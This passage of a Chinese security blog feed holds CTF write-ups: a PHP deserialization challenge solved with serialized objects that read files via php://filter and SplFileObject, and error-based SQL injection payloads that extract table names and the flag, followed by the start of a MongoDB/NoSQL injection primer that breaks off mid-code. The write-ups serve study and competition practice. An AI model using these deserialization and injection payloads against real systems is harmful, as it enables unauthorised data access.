class="token keyword">function</span> <span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">kelasi</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">par0</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par1</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'syclover    !'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">kelasi</span> <span class="token punctuation">.</span> <span class="token string">'     yyds'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//$ser = serialize($this -> kelasi);</span>        <span class="token comment" spellcheck="true">//$unser = unserialize($ser);</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">kelasi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">juts_a_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par3</span> <span class="token operator">==</span> <span class="token string">'unser'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        @<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par2</span> <span class="token punctuation">.</span> <span class="token string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//读取hint.php</span><span class="token comment" spellcheck="true">//$exp1 = new fxxk("","","php://filter/convert.base64-encode/resource=","");</span><span class="token comment" spellcheck="true">//echo serialize($exp1);</span><span class="token comment" spellcheck="true">//遍历目录</span><span class="token comment" spellcheck="true">//$exp2 = new fxxk("FilesystemIterator","/www/wwwroot/ctf.rigelx.top/unserbucket/aaaaaaaaaaafxadwagaefae/",null,"unsers");</span><span class="token comment" spellcheck="true">//echo serialize($exp2);</span><span class="token comment" spellcheck="true">//读取UcantGuess.php</span><span class="token comment" spellcheck="true">//$exp3 = new fxxk("SplFileObject","php://filter/convert.base64-encode/resource=/www/wwwroot/ctf.rigelx.top/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php",'r',"unsers");</span><span class="token comment" spellcheck="true">//echo serialize($exp3);</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按步骤</p><p>1、读取hint.php</p><p><img src="image-20211026215320977.png" alt="image-20211026215320977"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token string">'向管理员的页面post一个参数message(告诉他，"iwantflag") 和 另一个参数 url（它会向这个url发送一个flag'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'管理员的页面在当前目录下一个特殊文件夹里'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2、php原生类FilesystemIterator遍历目录</p><p><img src="image-20211026215505763.png" alt="image-20211026215505763"></p><p><img src="image-20211026215556129.png" alt="image-20211026215556129"></p><p>啥都没</p><p>3、php原生类SplFileObject读文件</p><p><img src="image-20211026215735929.png" alt="image-20211026215735929"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cl_ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$xff_ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'SYC{Unser1al1z3_is_so_fxxk}'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$cl_ip</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$xff_ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'just_this????????'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'just_for_me'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'iwantflag'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token shell-comment comment">#echo($flag);</span>        <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'?flag='</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{Unser1al1z3_is_so_fxxk}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这道题还是很有水平的</p><h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p>报错注入</p><p>过滤了最常用的updatexml和extractvalue,但其他偏门的没有过滤</p><p>所以直接百度一条payload</p><pre class="line-numbers language-payload"><code class="language-payload">id = 1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出处：<code>https://www.cnblogs.com/Dleo/p/5493782.html</code></p><blockquote><p>注意，下面查询结果最后的1是语句加的，不是本身的数据</p></blockquote><p>数据库：</p><pre class="line-numbers language-payload"><code class="language-payload">pwd=1&uname=Atmujie' or (select 1 from  (select count(*),concat(database(),floor(rand(0)*2))x from  information_schema.tables group by x)a)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211104144453074.png" alt="image-20211104144453074"></p><p>表：</p><pre class="line-numbers language-payload"><code class="language-payload">pwd=1&uname=Atmujie' or (select 1 from  (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2))x from  information_schema.tables group by x)a)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211104144701159.png" alt="image-20211104144701159"></p><p>列：</p><pre class="line-numbers language-payload"><code class="language-payload">pwd=1&uname=Atmujie' or (select 1 from  (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=database()),floor(rand(0)*2))x from  information_schema.tables group by x)a)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211104144940980.png" alt="image-20211104144940980"></p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>查flag</p><pre class="line-numbers language-payload"><code class="language-payload">pwd=1&uname=Atmujie' or (select 1 from  (select count(*),concat((select flag from true____flag.syclover limit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)a)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211104145817480.png" alt="image-20211104145817480"></p><h3 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_3rR0r_Inj3c410n}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nosql注入浅析</title>
      <link href="/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/"/>
      <url>/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Nosql并不特定的指某个数据库，而是泛指非关联型数据库</p><p>+++</p><p><img src="image-20211108160038156.png" alt="image-20211108160038156"></p><p>+++</p><h2 id="关系型数据库和非关系型数据库"><a href="#关系型数据库和非关系型数据库" class="headerlink" title="关系型数据库和非关系型数据库"></a>关系型数据库和非关系型数据库</h2><p>关系型数据库，是指采用了关系模型来组织数据的数据库。</p><p>简单来说就是以二维表格模型及其之前的联系组成的数据库</p><p><img src="image-20211108161150881.png" alt="image-20211108161150881"></p><p>除开关系型，不以数据间联系组成的数据库，统称为非关系型，代表为MongoDB</p><p><strong>非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合。</strong></p><p>+++</p><p><img src="image-20211108161321919.png" alt="image-20211108161321919"></p><p><img src="image-20211108161357763.png" alt="image-20211108161357763"></p><p>++++</p><p>参考文章<code>https://www.jianshu.com/p/fd7b422d5f93</code></p><p>nosql主要针对了非关系型数据库，其中代表主要为MongoDB和redis，所以需要学习这两个数据库的语法</p><h1 id="MongoDB-基础语法"><a href="#MongoDB-基础语法" class="headerlink" title="MongoDB 基础语法"></a>MongoDB 基础语法</h1><h2 id="基础须知语法"><a href="#基础须知语法" class="headerlink" title="基础须知语法"></a>基础须知语法</h2><p>MongoDB是以文档的形式来储存数据的数据库，所以对MongoDB而言，数据库即为当前操作的文档，表即为该文档的数据集合，数据以键值对的形式储存在集合中。</p><p><img src="image-20211108165230518.png" alt="image-20211108165230518"></p><p><img src="image-20211108171310688.png" alt="image-20211108171310688"></p><pre class="line-numbers language-mongo"><code class="language-mongo">db  - 显示当前数据库对象或集合/相当于mysql的 database();show dbs - 显示所有数据库 相当于 show databases;use 【库名】 - 数据库不存在，则创建数据库，否则切连接并换到指定数据库     属于mysql中use 和 create database 的二合一     use后的数据库并不会立即创建，而是在插入数据后才创建     如果没有指定数据库，会自动存放在默认的test数据库中     使用用户名和密码连接到 MongoDB 服务器，必须使用 'username:password@hostname/dbname' 格式    默认情况下直接mongo就可以    db.dropDatabase() - 删除数据库，使用该命令需要先用use指定数据库    use atmujie    db.dropDatabase()db.createCollection("集合名/表名",{ 参数【可选】}) - 创建集合/表    db.createCollection("mycol", { capped : true, autoIndexId : true, size : 6142800, max : 10000 } )    capped 如果为 true，则创建固定集合。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。    autoIndexId 3.2 之后不再支持该参数。（可选）如为 true，自动在 _id 字段创建索引。默认为 false。    size 为固定集合指定一个最大值，即字节数。如果 capped 为 true，也需要指定该字段。    max 指定固定集合中包含文档的最大数量。show collections - 查看当前表中的所有集合，这里支持使用show tables来查集合db.[集合名].drop() - 删除集合db.[集合名].insert({"key": "value"}) - 插入数据    同时mongo规定 save()插入数据    save()：如果 _id 主键存在则更新数据，如果不存在就插入数据。    该方法3.2版本中已废弃，可以使用 db.collection.insertOne() 或 db.collection.replaceOne() 来代替。    insert(): 若插入的数据主键已经存在，不保存当前数据。    insertOne和replaceOne具体用法见图1    db.[集合名].find() - 查看该表/集合下的所有数据，括号写条件可查询指定数据    db.col.find().pretty()方法以格式化的方式来显示所有文档。    见图二变量写入： document = ({                        .......                    });          db.[集合名].insert() //这可真方便开发          更新文档/行: db.[集合名].update(                {<query>},//update的查询条件，类似sql update查询内where后面的。                {<update>},//update的对象和一些更新的操作符（如$set,$inc...）等，也可以理解为sql update查询内set后面的                {                    upsert: <boolean>,                     //可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。                    multi: <boolean>,                    //可选，mongo默认只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。                    writeConcern: <document>                    //可选，抛出异常的级别。                }            )     // 例： db.mujie.update({"name":"mujie"},{$set:{"age":"20"}})    更新全部： db.[集合名].save({"_id" : ...}) // 替换_id的全部内容db.[集合名].remove({条件}，{选项}) - 删除文档    db.[集合名].remove({}) - 删除全部 相当于mysql truncate <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211108183657190.png" alt="图一"></p><p><img src="image-20211108195942133-16363727935411.png" alt="图二"></p><h2 id="MongoDB查询语句详解"><a href="#MongoDB查询语句详解" class="headerlink" title="MongoDB查询语句详解"></a>MongoDB查询语句详解</h2><blockquote><p><strong>语法：db.collection.find(query, projection)</strong></p><ul><li><strong>query</strong> ：可选，使用查询操作符指定查询条件</li><li><strong>projection</strong> ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。</li></ul></blockquote><h3 id="查询操作符"><a href="#查询操作符" class="headerlink" title="查询操作符"></a>查询操作符</h3><p><img src="image-20211108202318760.png" alt="image-20211108202318760"></p><pre class="line-numbers language-nosql"><code class="language-nosql">db.collections.find({    "key":"value", // 等于    "key":{$lt:"value"}, // 小于    "key":{$lte:"value"}, // 小于等于    "key":{$gt:"value"}, // 大于    "key":{$gte:"value"}, // 大于等于    "key":{$ne:"value"} // 不等于})<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="AND-条件"><a href="#AND-条件" class="headerlink" title="AND 条件"></a>AND 条件</h3><pre class="line-numbers language-mongo"><code class="language-mongo">db.collections.find(    {    "name":"atmujie",    "age":20    })<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回两者都满足的数据</p><p>相当于<code>where name=&quot;mujie&quot; and age=20</code></p><h3 id="OR语句"><a href="#OR语句" class="headerlink" title="OR语句"></a>OR语句</h3><pre class="line-numbers language-mongo"><code class="language-mongo">db.collections.find(    $or:[{"name":"mujie"},{"age":20}])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用关键字$or</p><p>相当于where name=”mujie” or age=20</p><pre class="line-numbers language-mongo"><code class="language-mongo">// and or 联合使用db.collections.fond(    {"name":"mujie"},    $or:[{"age":20},{"age":"14"}])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相当于 where name=”mujie” and (age=20 or age=14)</p><h3 id="type操作符"><a href="#type操作符" class="headerlink" title="$type操作符"></a>$type操作符</h3><p>$type基于类型来检索数据</p><p>和大于小于等于一致，同属于操作符</p><pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find({"name":{$type:"string"}})// 查询key为name时的所有字符数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211108214457065.png" alt="image-20211108214457065"></p><h3 id="Limit-方法与Skip-方法"><a href="#Limit-方法与Skip-方法" class="headerlink" title="Limit()方法与Skip()方法"></a>Limit()方法与Skip()方法</h3><p>同mysql的limit,mongodb中同样用limit指定显示的记录</p><pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find().limit(1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211108215101776.png" alt="image-20211108215101776"></p><p>Skip()方法用于跳过指定量的数据</p><pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find().Skip(1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211108215319010.png" alt="image-20211108215319010"></p><p>MongoDB中大多数命令可以联合使用</p><h3 id="排序-sort-方法"><a href="#排序-sort-方法" class="headerlink" title="排序 sort()方法"></a>排序 sort()方法</h3><p>sort() 方法可以通过参数指定排序的字段，并使用 1 和 -1 来指定排序的方式，其中 1 为升序排列，而 -1 是用于降序排列。</p><pre class="line-numbers language-mongo"><code class="language-mongo">db.collections.find().sort({KEY:1})<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211108220954222.png" alt="image-20211108220954222"></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>+++</p><p><img src="image-20211108221511871.png" alt="image-20211108221511871"></p><p>+++</p><pre class="line-numbers language-mongo"><code class="language-mongo">创建索引db.collections.createIndex({"key":1/-1})1 为指定按升序创建索引，-1 为降序db.mujie.totalSize("_id_")db.mujie.dropIndex("name_1")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211109135439733-16364372884122.png" alt="image-20211109135439733"></p><p>对于每一个集合（除了capped集合），默认会在_id字段上创建索引，而且这个特别的索引不能删除。_id字段是强制唯一的，由数据库维护。</p><h2 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h2><p>用于处理数据(诸如统计平均值，求和等)，并返回计算后的数据结果。，类似 <strong>SQL</strong> 语句中的 **count(*)**。</p><pre class="line-numbers language-mongo"><code class="language-mongo">db.col.aggregate(AGGREGATE_OPERATION)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>++++</p><blockquote><p>管道</p></blockquote><p><img src="image-20211109153134414.png" alt="image-20211109153134414"></p><blockquote><p>操作</p></blockquote><p><img src="image-20211109152247966.png" alt="image-20211109152247966"></p><p>+++</p><pre class="line-numbers language-mongo"><code class="language-mongo">语法详解db.col.aggregate(    [{        $group:{            _id:"$name",            a:{                    $last:"$age"            },            b:{                $first:"$age"            }        }    }])aggregate(    $管道符:{        _id:"$key1", // 必须，设定一个key为主键，按该值将数据分组        自定义key:{$操作符:"$key2"}, // 可选，将指定的key2进行操作符指示的处理后赋值给自定义的key        自定义key....    })相当于mysql: select name,count([符合操作的数据]) form users group by name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211109155105289.png" alt="image-20211109155105289"></p><p>到这里nosql注入中MongoDB语法掌握的东西就差不多了</p><p>起码注入不会有太多问题</p><h1 id="编程语言连接MongoDB"><a href="#编程语言连接MongoDB" class="headerlink" title="编程语言连接MongoDB"></a>编程语言连接MongoDB</h1><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><p>在java中使用MongoDB首先哟啊安装JDBC驱动</p><p>其次导入mongo jar包</p><pre class="line-numbers language-Maven"><code class="language-Maven"><!-- https://mvnrepository.com/artifact/org.mongodb/mongo-java-driver --><dependency>    <groupId>org.mongodb</groupId>    <artifactId>mongo-java-driver</artifactId>    <version>3.12.10</version></dependency><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//连接数据库</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>mongodb<span class="token punctuation">.</span>MongoClient<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>mongodb<span class="token punctuation">.</span>client<span class="token punctuation">.</span>MongoDatabase<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MongoDBJDBC</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">try</span><span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">// 连接到 mongodb 服务</span>         MongoClient mongoClient <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span> <span class="token string">"localhost"</span> <span class="token punctuation">,</span> <span class="token number">27017</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 连接到数据库</span>         MongoDatabase mongoDatabase <span class="token operator">=</span> mongoClient<span class="token punctuation">.</span><span class="token function">getDatabase</span><span class="token punctuation">(</span><span class="token string">"mycol"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Connect to database successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>安装MongoDB扩展看<code>https://www.runoob.com/mongodb/mongodb-install-php-driver.html</code></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// php7连接MongoDB</span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 连接数据库</span><span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"连接MongoDB失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 插入数据【增】</span><span class="token variable">$mongoInsert</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>BulkWrite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mongoInsert</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"你问我我问谁"</span><span class="token punctuation">,</span><span class="token string">"emm"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"php7的MongoDB怎么和java有一拼"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeBulkWrite</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoInsert</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 删除数据【删】</span><span class="token variable">$mongoDelete</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>BulkWrite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mongoDelete</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"limit"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// limit为1删除匹配的第一条，为0删除配的全部，默认0</span><span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeBulkWrite</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoDelete</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 更新数据【改】</span><span class="token variable">$mongoUpdate</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>BulkWrite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mongoUpdate</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span 